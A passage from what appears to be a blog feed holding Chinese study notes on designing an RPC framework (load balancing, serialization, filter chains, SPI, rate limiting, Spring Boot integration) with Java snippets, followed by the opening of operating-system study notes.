class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>&#125;<br>channelFutureWrappers.add(wrapper);<br><span class="hljs-comment">// 将连接添加到CONNECT_MAP中</span><br><span class="hljs-comment">// 连接CONNECT_MAP -&gt; key：需要调用的serviceName</span><br><span class="hljs-comment">//  -&gt; value：与多个服务提供者建立的连接，为List</span><br>CONNECT_MAP.put(providerServiceName, channelFutureWrappers);<br></code></pre></td></tr></table></figure></li><li><p>获取连接逻辑如下：getChannelFuture方法</p><p>每个服务可以有多个服务提供者（对应于多个物理机器）</p><p>负载均衡策略：采用简单的random函数随机选取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;ChannelFutureWrapper&gt; channelFutureWrappers = CONNECT_MAP.get(providerServiceName);<br><span class="hljs-keyword">if</span> (CommonUtils.isEmptyList(channelFutureWrappers)) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;no provider exist for &quot;</span> + providerServiceName);<br>&#125;<br><span class="hljs-type">ChannelFuture</span> <span class="hljs-variable">channelFuture</span> <span class="hljs-operator">=</span> channelFutureWrappers.get(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(channelFutureWrappers.size())).getChannelFuture();<br><span class="hljs-keyword">return</span> channelFuture;<br></code></pre></td></tr></table></figure></li></ol><h3 id="2-5-远程调用流程"><a href="#2-5-远程调用流程" class="headerlink" title="2.5 远程调用流程"></a>2.5 远程调用流程</h3><h2 id="3-引入路由层"><a href="#3-引入路由层" class="headerlink" title="3. 引入路由层"></a>3. 引入路由层</h2><p>同一个服务可能对应着多个服务提供者，因此当客户端请求服务时，需要通过负载均衡策略从中选择一个合适的服务提供者</p><p>之前的设计思路为：从多个<strong>连接</strong>（ChannelFuture通道）中随机选择一个，进行网络通信</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ChannelFuture</span> <span class="hljs-variable">channelFuture</span> <span class="hljs-operator">=</span> channelFutureWrappers.get(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(channelFutureWrappers.size())).getChannelFuture();<br></code></pre></td></tr></table></figure><p>引入路由层，可以自定义负载均衡策略进行优化。</p><p>基于 <code>SERVICE_ROUTER_MAP</code> 实现</p><ul><li>key为服务提供者名字，value为对应的连接数组</li></ul><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">key -&gt; ProviderServiceName: <span class="hljs-built_in">String</span><br>value -&gt; ChannelFutureWrapper[]: <span class="hljs-built_in">Array</span><br></code></pre></td></tr></table></figure><h3 id="3-1-带权重的随机选取策略"><a href="#3-1-带权重的随机选取策略" class="headerlink" title="3.1 带权重的随机选取策略"></a>3.1 带权重的随机选取策略</h3><p>自定义随机选取逻辑，将转化后的连接数组存入 SERVICE_ROUTER_MAP 中</p><p>虽然是随机选取，但是权重值越大，被选取的次数也会越多</p><p>默认初始情况下weight值为100</p><h3 id="3-2-轮询策略"><a href="#3-2-轮询策略" class="headerlink" title="3.2 轮询策略"></a>3.2 轮询策略</h3><p>直接按照添加的先后顺序获取连接，将转化后的连接数组存入 SERVICE_ROUTER_MAP 中</p><h3 id="3-3-获取连接实现"><a href="#3-3-获取连接实现" class="headerlink" title="3.3 获取连接实现"></a>3.3 获取连接实现</h3><p>ChannelFuturePollingRef为实现类，用于从SERVICE_ROUTER_MAP中根据服务提供者名字轮询获取连接</p><p>本质是通过原子类取模运算获取连接</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">AtomicLong</span> <span class="hljs-variable">referenceTimes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicLong</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">public</span> ChannelFutureWrapper <span class="hljs-title function_">getChannelFutureWrapper</span><span class="hljs-params">(String serviceName)</span> &#123;<br>    ChannelFutureWrapper[] arr = SERVICE_ROUTER_MAP.get(serviceName);<br>    <span class="hljs-type">long</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> referenceTimes.getAndIncrement();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) (i % arr.length);<br>    <span class="hljs-keyword">return</span> arr[index];<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-4-权重更新事件"><a href="#3-4-权重更新事件" class="headerlink" title="3.4 权重更新事件"></a>3.4 权重更新事件</h3><p>每个服务提供者在注册服务时默认的权重初始值为100。当该值被修改后，触发权重更新事件，修改对应的 SERVICE_ROUTER_MAP</p><p>该更新事件也是通过Watcher与自定义的监听事件机制实现，参考 <code>2.3</code></p><h2 id="4-整合序列化"><a href="#4-整合序列化" class="headerlink" title="4. 整合序列化"></a>4. 整合序列化</h2><p>引入多种序列化策略，由用户自行配置与选择对应的策略</p><ul><li>FastJson</li><li>Hessian</li><li>Kryo</li><li>JDK自带的序列化</li></ul><h3 id="4-1-序列化工厂"><a href="#4-1-序列化工厂" class="headerlink" title="4.1 序列化工厂"></a>4.1 序列化工厂</h3><p>创建序列化工厂接口，定义接口方法：serialize与deserialize（均为范型方法）</p><p>具体的序列化策略去实现该工厂类。</p><ul><li>SerializeFactory<ul><li>FastJsonSerializeFactory</li><li>HessianSerializeFactory</li><li>KryoSerializeFactory</li><li>JdkSerializeFactory</li></ul></li></ul><h3 id="4-2-序列化策略配置"><a href="#4-2-序列化策略配置" class="headerlink" title="4.2 序列化策略配置"></a>4.2 序列化策略配置</h3><p>序列化策略在Server与Client初始化时从配置文件中加载</p><h2 id="5-引入责任链模式"><a href="#5-引入责任链模式" class="headerlink" title="5. 引入责任链模式"></a>5. 引入责任链模式</h2><h3 id="5-1-责任链模式的意义"><a href="#5-1-责任链模式的意义" class="headerlink" title="5.1 责任链模式的意义"></a>5.1 责任链模式的意义</h3><ol><li><p>对客户端请求进行鉴权</p><p>客户端请求的远程接口可能需要进行权限校验（比如与用户隐私相关的数据），服务端必须确认该请求合法才可放行</p></li><li><p>分组管理服务</p><p>同一个服务可能存在多个分支，有的分支为dev代表正在处于开发阶段，有的分支为test代表正在处于测试阶段。</p><p>为了避免客户端调用到正在开发中的服务，在进行远程调用时，需要根据group进行过滤。</p></li><li><p>基于ip直连方式访问服务端</p><p>可能存在两个名字相同但代码逻辑不同的服务。为了避免出现不同的结果，需要根据服务提供方的ip进行过滤</p></li><li><p>调用过程中记录日志信息</p></li></ol><p>传统模式中，客户端需要在发送请求之前，逐个的调用过滤请求的方法；服务端在接受请求之前，也需要逐个调用过滤请求的方法</p><p>这种模式下，代码耦合度高，且扩展性差。</p><p>而采用责任链模式可以带来：</p><ul><li>发送者与接收方的处理对象类之间解耦。</li><li>封装每个处理对象，处理类的最小封装原则。</li><li>可以任意添加处理对象，调整处理对象之间的顺序，提高了维护性和可拓展性，可以根据需求新增处理类，满足开闭原则。</li><li>增强了对象职责指派的灵活性，当流程发生变化的时候，可以动态地改变链内的调动次序可动态的新增或者删除。</li><li>责任链简化了对象之间的连接。每个对象只需保持一个指向其后继者的引用，不需保持其他所有处理者的引用，这避免了使用众多的 if 或者 if···else 语句。</li><li>责任分担。每个类只需要处理自己该处理的工作，不该处理的传递给下一个对象完成，明确各类的责任范围，符合类的单一职责原则。</li></ul><h3 id="5-2-责任链设计"><a href="#5-2-责任链设计" class="headerlink" title="5.2 责任链设计"></a>5.2 责任链设计</h3><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xl">├── IFilter.java<br>├── IC<span class="hljs-function"><span class="hljs-title">lientFilter</span>.java              -&gt;</span> 继承IFilter接口<br>├── IS<span class="hljs-function"><span class="hljs-title">erverFilter</span>.java-&gt;</span> 继承IFilter接口<br>├── client<br>│   ├── C<span class="hljs-function"><span class="hljs-title">lientFilterChain</span>.java-&gt;</span> 客户端过滤链<br>│   ├── C<span class="hljs-function"><span class="hljs-title">lientLogFilterImpl</span>.java-&gt;</span> 日志过滤器实现类<br>│   ├── D<span class="hljs-function"><span class="hljs-title">irectInvokeFilterImpl</span>.java -&gt;</span> IP过滤器实现类<br>│   └── G<span class="hljs-function"><span class="hljs-title">roupFilterImpl</span>.java-&gt;</span> 分组过滤器实现类<br>└── server<br>    ├── S<span class="hljs-function"><span class="hljs-title">erverFilterChain</span>.java-&gt;</span> 服务器过滤链<br>    ├── S<span class="hljs-function"><span class="hljs-title">erverLogFilterImpl</span>.java-&gt;</span> 日志过滤器实现类<br>    └── S<span class="hljs-function"><span class="hljs-title">erverTokenFilterImpl</span>.java  -&gt;</span> Token安全校验过滤器实现类<br><br></code></pre></td></tr></table></figure><ol><li>首先创建IFilter接口，然后分别创建服务器与客户端对应的接口，继承IFilter接口</li><li>分别创建服务器与客户端过滤链，用于存放过滤器实现类，并遍历过滤器实现类集合，执行过滤方法</li><li>依次实现过滤器实现类</li></ol><h2 id="6-可插拔式组件"><a href="#6-可插拔式组件" class="headerlink" title="6. 可插拔式组件"></a>6. 可插拔式组件</h2><h3 id="6-1-SPI优势"><a href="#6-1-SPI优势" class="headerlink" title="6.1 SPI优势"></a>6.1 SPI优势</h3><p>使用Java SPI机制的优势是实现解耦，使得第三方服务模块的装配控制的逻辑与调用者的业务代码分离，而不是耦合在一起。应用程序可以根据实际业务情况启用框架扩展或替换框架组件。</p><p>相比使用提供接口jar包，供第三方服务模块实现接口的方式，SPI的方式使得源框架，不必关心接口的实现类的路径，可以不用通过下面的方式获取接口实现类：</p><ul><li>代码硬编码import 导入实现类</li><li>指定类全路径反射获取：例如在JDBC4.0之前，JDBC中获取数据库驱动类需要通过**Class.forName(“com.mysql.jdbc.Driver”)**，类似语句先动态加载数据库相关的驱动，然后再进行获取连接等的操作</li><li>第三方服务模块把接口实现类实例注册到指定地方，源框架从该处访问实例</li></ul><p>通过SPI的方式，第三方服务模块实现接口后，在第三方的项目代码的META-INF&#x2F;services目录下的配置文件指定实现类的全路径名，源码框架即可找到实现类</p><h3 id="6-2-SPI设计思路"><a href="#6-2-SPI设计思路" class="headerlink" title="6.2 SPI设计思路"></a>6.2 SPI设计思路</h3><p>设计一个SPI加载类，通过当前Class的类加载器去加载META-INF&#x2F;irpc&#x2F;目录底下存在的资源文件</p><p>在需要加载资源时（初始化序列化框架、初始化过滤链、初始化路由策略、初始化注册中心），使用SPI加载类去实现</p><p>从而避免了在代码中通过switch语句以硬编码的方式选择资源</p><h2 id="7-队列与多线程"><a href="#7-队列与多线程" class="headerlink" title="7. 队列与多线程"></a>7. 队列与多线程</h2><h3 id="7-1-串行同步阻塞问题"><a href="#7-1-串行同步阻塞问题" class="headerlink" title="7.1 串行同步阻塞问题"></a>7.1 串行同步阻塞问题</h3><p>NIO线程常见的阻塞情况，一共两大类：</p><ul><li><p>无意识：在ChannelHandler中编写了可能导致NIO线程阻塞的代码，但是用户没有意识到，包括但不限于查询各种数据存储器的操作、第三方服务的远程调用、中间件服务的调用、等待锁等。</p></li><li><p>有意识：用户知道有耗时逻辑需要额外处理，但是在处理过程中翻车了，比如主动切换耗时逻辑到业务线程池或者业务的消息队列做处理时发生阻塞，最典型的有对方是阻塞队列，锁竞争激烈导致耗时，或者投递异步任务给消息队列时异机房的网络耗时，或者任务队列满了导致等待，等等。</p></li></ul><p>服务端接收到消息之后</p><ol><li><p>需要对消息进行解码，使字节序列变为消息对象。</p></li><li><p>将消息对象与上下文传入ServerHandler中进行进一步处理。</p><p>可能某个业务Handler处理流程非常耗时，如查询数据库。为了避免线程被长时间占用，采用异步消费进行处理</p></li></ol><p>客户端通过动态代理层封装RpcInvocation对象并将其放入SEND_QUEUE队列后，需要同步阻塞等待最终处理的响应结果</p><ul><li>可以将此处改为同步与异步两种方式</li></ul><h3 id="7-2-异步设计"><a href="#7-2-异步设计" class="headerlink" title="7.2 异步设计"></a>7.2 异步设计</h3><ol><li><p>对于服务端：</p><p>当请求抵达服务器时，将其直接丢入业务阻塞队列中，然后开辟一个新的线程，从阻塞队列中循环获取Handler请求任务。</p><p>将获取到的任务对象交付于业务线程池进行消费处理。</p></li><li><p>对于客户端：</p><p>在RpcReferenceWrapper中设置一个isAsync字段，用于判断是否为异步。</p><p>若该字段为True，则在动态代理层中，不需要同步阻塞等待响应结果，直接返回null即可。</p></li></ol><h2 id="8-容错设计"><a href="#8-容错设计" class="headerlink" title="8. 容错设计"></a>8. 容错设计</h2><h3 id="8-1-报错日志打印"><a href="#8-1-报错日志打印" class="headerlink" title="8.1 报错日志打印"></a>8.1 报错日志打印</h3><p>当客户端发送请求到指定的服务提供者后，其调用对应的方法，但此时方法出现异常Exception。</p><p>若将异常只记录在服务端中，则客户端较难定位异常发生的时间、位置与原因，因为同一个服务可能有多个服务提供者。</p><p>因此，服务端在处理异常时，需要将所有异常捕获，并写回到客户端。</p><p>实现流程如下：</p><ol><li><p>RpcInvocation类中添加异常字段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Throwable e;<br></code></pre></td></tr></table></figure></li><li><p>服务端处理接收到的请求时，用try-catch进行捕获，并设置异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 业务异常</span><br>rpcInvocation.setE(e);<br></code></pre></td></tr></table></figure></li><li><p>客户端处理器ClientHandler中，读取响应结果时，对异常进行判断。如果该字段不为空，则打印异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (rpcInvocation.getE() != <span class="hljs-literal">null</span>) &#123;<br>    rpcInvocation.getE().printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="8-2-超时重试机制"><a href="#8-2-超时重试机制" class="headerlink" title="8.2 超时重试机制"></a>8.2 超时重试机制</h3><p>TODO:</p><h3 id="8-3-服务端流量控制"><a href="#8-3-服务端流量控制" class="headerlink" title="8.3 服务端流量控制"></a>8.3 服务端流量控制</h3><h4 id="8-3-1-总体限流"><a href="#8-3-1-总体限流" class="headerlink" title="8.3.1 总体限流"></a>8.3.1 总体限流</h4><p>限制服务端的总体连接数，超过指定连接数时，拒绝剩余的连接请求。</p><p>TODO:</p><h4 id="8-3-2-单服务限流"><a href="#8-3-2-单服务限流" class="headerlink" title="8.3.2 单服务限流"></a>8.3.2 单服务限流</h4><p>采用 <strong>Semaphore</strong> 进行流量控制，在每一个服务进行注册时，便指定服务对应的最大连接数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//设置服务端的限流器</span><br>SERVER_SERVICE_SEMAPHORE_MAP.put(interfaceClass.getName(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerServiceSemaphoreWrapper</span>(serviceWrapper.getLimit()));<br></code></pre></td></tr></table></figure><p>在请求到达服务端之前，配置一层前置过滤器。</p><ul><li>当当前连接数超过最大连接数时，根据Semaphore的tryAcquire原理，会直接返回False，据此判断流量超峰，抛出异常。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(RpcInvocation rpcInvocation)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">serviceName</span> <span class="hljs-operator">=</span> rpcInvocation.getTargetServiceName();<br>    <span class="hljs-type">ServerServiceSemaphoreWrapper</span> <span class="hljs-variable">serverServiceSemaphoreWrapper</span> <span class="hljs-operator">=</span> SERVER_SERVICE_SEMAPHORE_MAP.get(serviceName);<br>    <span class="hljs-comment">//从缓存中提取semaphore对象</span><br>    <span class="hljs-type">Semaphore</span> <span class="hljs-variable">semaphore</span> <span class="hljs-operator">=</span> serverServiceSemaphoreWrapper.getSemaphore();<br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">tryResult</span> <span class="hljs-operator">=</span> semaphore.tryAcquire();<br>    <span class="hljs-keyword">if</span> (!tryResult) &#123;<br>        LOGGER.error(<span class="hljs-string">&quot;[ServerServiceBeforeLimitFilterImpl] &#123;&#125;&#x27;s max request is &#123;&#125;,reject now&quot;</span>, rpcInvocation.getTargetServiceName(), serverServiceSemaphoreWrapper.getMaxNums());<br>        <span class="hljs-type">MaxServiceLimitRequestException</span> <span class="hljs-variable">iRpcException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MaxServiceLimitRequestException</span>(rpcInvocation);<br>        rpcInvocation.setE(iRpcException);<br>        <span class="hljs-keyword">throw</span> iRpcException;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当当前请求结束之后，需要对资源进行释放，也就是对Semaphore持有资源数加1。通过请求后置过滤器实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(RpcInvocation rpcInvocation)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">serviceName</span> <span class="hljs-operator">=</span> rpcInvocation.getTargetServiceName();<br>    <span class="hljs-type">ServerServiceSemaphoreWrapper</span> <span class="hljs-variable">serverServiceSemaphoreWrapper</span> <span class="hljs-operator">=</span> SERVER_SERVICE_SEMAPHORE_MAP.get(serviceName);<br>    serverServiceSemaphoreWrapper.getSemaphore().release();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="9-接入SpringBoot"><a href="#9-接入SpringBoot" class="headerlink" title="9. 接入SpringBoot"></a>9. 接入SpringBoot</h2><h3 id="9-1-定义注解"><a href="#9-1-定义注解" class="headerlink" title="9. 1 定义注解"></a>9. 1 定义注解</h3><ol><li><p>客户端对需要调用的服务添加 <code>@IRpcReference</code> 注解</p><p>在Spring容器启动过程中，将带有此注解的字段进行构建，<strong>让它们的句柄可以指向一个代理类</strong></p><p><strong>这样在使用UserService和OrderService类对应的方法时候就会感觉到似乎在执行本地调用一样，降低开发者的代码编写难度。</strong></p></li><li><p>服务端通过 <code>@IRpcService</code> 注解对服务进行暴露，将其注入到Spring容器中</p><ul><li>该注解内部添加了 <code>@Component</code> 注解，因此能被扫描到Spring容器中</li></ul></li></ol><h3 id="9-2-定义自动装配对象类"><a href="#9-2-定义自动装配对象类" class="headerlink" title="9.2 定义自动装配对象类"></a>9.2 定义自动装配对象类</h3><h4 id="9-2-1-服务端"><a href="#9-2-1-服务端" class="headerlink" title="9.2.1 服务端"></a>9.2.1 服务端</h4><p>服务端自动装配流程</p><ol><li><p>初始化服务端配置</p><ul><li>从 <code>irpc.properties</code> 中读取相关配置并写入config</li><li>初始化线程池、队列</li><li>通过 <code>SPI</code> 初始化序列化框架、过滤链</li><li>初始化并注册启动事件监听器</li></ul></li><li><p>Spring从容器中筛选出带有 <code>@IRpcService</code> 注解的类，以Map形式封装</p></li><li><p>将每一个Map中的对象封装为 <code>ServiceWrapper</code> 对象，并从注解中提取并设置相应的属性，将service注册到注册中心</p></li><li><p>开启服务端，准备接收任务</p></li></ol><h4 id="9-2-2-客户端"><a href="#9-2-2-客户端" class="headerlink" title="9.2.2 客户端"></a>9.2.2 客户端</h4><p>客户端自动装配流程</p><ol><li>初始化客户端配置<ul><li>从 <code>irpc.properties</code> 中读取相关配置并写入config</li><li>通过 <code>SPI</code> 初始化动态代理</li></ul></li><li>获取带有 <code>@IRpcReference</code> 注解的类，从注解中提取并设置相应的属性</li><li>在注册中心中订阅对应的服务</li></ol><h2 id="附：额外记录"><a href="#附：额外记录" class="headerlink" title="附：额外记录"></a>附：额外记录</h2><h3 id="附1-本地公共缓存"><a href="#附1-本地公共缓存" class="headerlink" title="附1 本地公共缓存"></a>附1 本地公共缓存</h3><p>缓存中主要存放客户端订阅信息、服务端注册信息、服务对应的通信连接信息、用于实现异步的队列等通用数据</p><p>分为客户端缓存与服务端缓存： CommonClientCache 与 CommonServerCache</p><h3 id="附2-服务端终止监听事件"><a href="#附2-服务端终止监听事件" class="headerlink" title="附2 服务端终止监听事件"></a>附2 服务端终止监听事件</h3><p>当某一服务提供者下线时，需要将其对应的服务器从Zookeeper注册中心中移除</p><p>监听机制原理相同，参考 <code>2.3</code></p><p>回调方法逻辑如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">callBack</span><span class="hljs-params">(Object t)</span> &#123;<br>    <span class="hljs-keyword">for</span> (URL url : PROVIDER_URL_SET) &#123;<br>        REGISTRY_SERVICE.unRegister(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="附3-可扩展性设计"><a href="#附3-可扩展性设计" class="headerlink" title="附3 可扩展性设计"></a>附3 可扩展性设计</h3><h4 id="冗余类"><a href="#冗余类" class="headerlink" title="冗余类"></a>冗余类</h4><p>该RPC框架中很多地方存在着冗余设计，比如RpcReference、ApplicationShutdownHook、ChannelFuturePollingRef等</p><p>这些类中可能只有一个属性或一个方法，但是单独抽象成一个类，便于之后在此基础上进行扩展。</p><h4 id="事件监听解耦"><a href="#事件监听解耦" class="headerlink" title="事件监听解耦"></a>事件监听解耦</h4><p>Watcher对Zookeeper节点进行监听，当事件发生后，并不是直接处理，而是将该事件交于IRpcListenerLoader，让其选择对应对应的事件监听器去处理，进一步解耦。</p><p>因此，在初始化客户端与服务端的时候，需要将事件监听器注册到IRpcListenerLoader上进行管理。</p><h3 id="附4-包装类设计"><a href="#附4-包装类设计" class="headerlink" title="附4 包装类设计"></a>附4 包装类设计</h3><p>将同一业务逻辑下的属性进行封装，如：</p><ul><li><p>URLChangeWrapper：当节点信息发生变化时，触发监听事件。</p><p>将改变节点的路径与对应的服务名存放到该类中。当Watcher监听到节点信息变化时，便可将信息封装到该类中，发送给IRpcListenerLoader去处理</p></li><li><p>ChannelFutureWrapper：底层网络通信连接类，SERVICE_ROUTER_MAP存储的连接数组就是这个类</p></li></ul><h3 id="附5-配置类设计"><a href="#附5-配置类设计" class="headerlink" title="附5 配置类设计"></a>附5 配置类设计</h3><p>将客户端与服务端的相关配置属性提取到配置文件中，避免硬编码，进一步解耦。</p><p>需要修改相关属性时，直接对配置文件进行修改。</p><p>基本流程为：服务端与客户端在启动时，通过配置方法从指定文件中读取配置项，将具体配置属性转化为配置对象。</p><p>结构树如下：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl">├── rpc-consumer<br>│   ├── C<span class="hljs-function"><span class="hljs-title">lientConfig</span>.java    -&gt;</span> 客户端配置属性类<br>│   ├── P<span class="hljs-function"><span class="hljs-title">ropertiesBootstrap</span>.java    -&gt;</span> 用于设置配置并返回配置类对象<br>│   ├── P<span class="hljs-function"><span class="hljs-title">ropertiesLoader</span>.java-&gt;</span> 用于从文件中读取加载配置<br>│   └── S<span class="hljs-function"><span class="hljs-title">erverConfig</span>.java-&gt;</span> 服务端配置属性类<br></code></pre></td></tr></table></figure><h1 id="RPC项目bug记录"><a href="#RPC项目bug记录" class="headerlink" title="RPC项目bug记录"></a>RPC项目bug记录</h1><ol><li><p>测试不引入springboot远程调用时，采用kryo在服务端无法完成反序列化</p><p>解决方案：暂时更换为jdk序列化</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>分布式</category>
      
    </categories>
    
    
    <tags>
      
      <tag>分布式</tag>
      
      <tag>Zookeeper</tag>
      
      <tag>微服务</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统学习笔记</title>
    <link href="/2022/11/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/11/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="操作系统学习笔记"><a href="#操作系统学习笔记" class="headerlink" title="操作系统学习笔记"></a>操作系统学习笔记</h1><h2 id="1-操作系统概述"><a href="#1-操作系统概述" class="headerlink" title="1. 操作系统概述"></a>1. 操作系统概述</h2><h3 id="1-1-操作系统概念"><a href="#1-1-操作系统概念" class="headerlink" title="1.1 操作系统概念"></a>1.1 操作系统概念</h3><ol><li>控制和管理整个计算机系统的硬件和软件资源，合理组织调度计算机的工作和资源。<ul><li>处理机管理、存储器管理、文件管理、设备管理</li></ul></li><li>提供给用户其它软件方便的接口与环境<ul><li>命令接口：用户直接使用<ul><li>联机命令接口：终端命令直接交互</li><li>脱机命令接口：将所有需要执行的命令放入文件中批量执行</li></ul></li><li>程序接口：系统调用，用户通过程序间接使用</li><li>GUI图形用户界面</li></ul></li><li>是计算机系统中最基本的系统软件</li></ol><p>操作系统将CPU抽象为进程、磁盘抽象为文件、内存抽象为地址空间，提供给应用程序使用</p><p>操作系统层次架构：硬件之上、应用程序之下，处于中间层</p><p>操作系统主要关注Kernel内核，而非暴露在外部的Shell。</p><ul><li>CPU管理、内存管理、文件系统管理、中断处理与IO设备驱动</li></ul><h3 id="1-2-操作系统特征"><a href="#1-2-操作系统特征" class="headerlink" title="1.2 操作系统特征"></a>1.2 操作系统特征</h3><p>OS Kernel 特征：并发与共享互为存在条件、没有并发与共享则谈不上虚拟与异步</p><ol><li><p>并发：两个或多个事件在同一时间间隔内发生。宏观上同时发生，微观上交替发生。</p><ul><li><p>区分概念 -&gt; 并行：两个或多个事件在同一时刻同时发生。</p></li><li><p>一个单核CPU同一时刻只能执行一个程序 -&gt; 并发</p></li><li><p>尽管目前存在多核CPU，但仍然需要并发性</p></li></ul></li><li><p>共享：系统中的资源可供内存中多个并发执行的进程使用</p><ul><li>互斥共享：一个时间段内仅允许一个进程访问该资源</li><li>同时共享：一个时间段内多个进程“同时”访问该资源（宏观同时、微观交替）</li></ul></li><li><p>虚拟：利用多道程序设计技术，让每个用户都觉得有一个计算机专门为他服务</p><ul><li>空分复用</li><li>时分复用</li></ul></li><li><p>异步：程序的执行不是一贯到底，而是走走停停，以不可预知的速度向前推进。但只要运行环境相同，OS需要保证最终程序运行的结果也相同。</p></li></ol><h3 id="1-3-操作系统运行机制"><a href="#1-3-操作系统运行机制" class="headerlink" title="1.3 操作系统运行机制"></a>1.3 操作系统运行机制</h3><p>两种指令：</p><ul><li>特权指令：如内存清理指令，不允许用户程序使用</li><li>非特权指令：如普通的运算指令</li></ul><p>两种处理器状态：用程序状态寄存器PSW实现</p><ul><li>用户态：此时CPU只能执行非特权指令</li><li>核心态：两种指令均可执行</li></ul><p>两种程序：</p><ul><li>内核程序：操作系统的内核程序是系统管理者，运行在核心态</li><li>应用程序：普通应用程序运行在用户态</li></ul><h3 id="1-4-操作系统内核"><a href="#1-4-操作系统内核" class="headerlink" title="1.4 操作系统内核"></a>1.4 操作系统内核</h3><p>内核是计算机配置的底层软件，是操作系统最基本、最核心的部分。</p><ul><li>时钟管理：实现计算机计时功能。所有管理工作需要基于计时实现。</li><li>中断处理：负责实现中断机制</li><li>原语：是一种特殊程序，是最接近硬件的部分，这种程序的运行具有原子性。</li><li>为系统资源进行管理的功能：进程管理、存储器管理、设备管理<ul><li>有的系统将此归于操作系统内核，有的系统则不这样做</li></ul></li></ul><h3 id="1-5-操作系统体系结构"><a href="#1-5-操作系统体系结构" class="headerlink" title="1.5 操作系统体系结构"></a>1.5 